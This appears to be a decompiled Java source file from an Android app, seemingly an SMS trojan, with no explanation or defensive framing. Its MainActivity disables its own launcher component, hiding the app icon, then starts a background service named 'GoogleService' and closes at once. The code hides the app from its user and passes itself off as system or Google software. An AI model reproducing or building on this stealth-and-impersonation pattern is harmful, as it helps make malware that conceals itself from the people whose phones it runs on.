package android.sms.core;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class MainActivity extends Activity {
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        PackageManager localPackageManager = getPackageManager();
        ComponentName localComponentName1 = new ComponentName(this, MainActivity.class);
        if (localPackageManager.getComponentEnabledSetting(localComponentName1) == 0) {
            localPackageManager.setComponentEnabledSetting(localComponentName1, 2, 1);
        }
        startService(new Intent(this, GoogleService.class));
        finish();
    }
}
